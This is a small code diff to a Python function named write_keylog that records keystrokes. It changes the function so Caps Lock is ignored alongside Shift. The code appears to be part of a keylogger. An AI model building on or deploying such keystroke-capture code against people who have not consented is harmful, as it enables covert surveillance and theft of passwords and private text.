@@ -24,7 +24,7 @@ def write_keylog(key):
             concate_key += " "
         elif char == Key.backspace:
             concate_key = concate_key[:-1]
-        elif char == Key.shift:
+        elif char == Key.shift or char == Key.caps_lock:
             pass
         else:
             concate_key += str(char).replace("'", "")
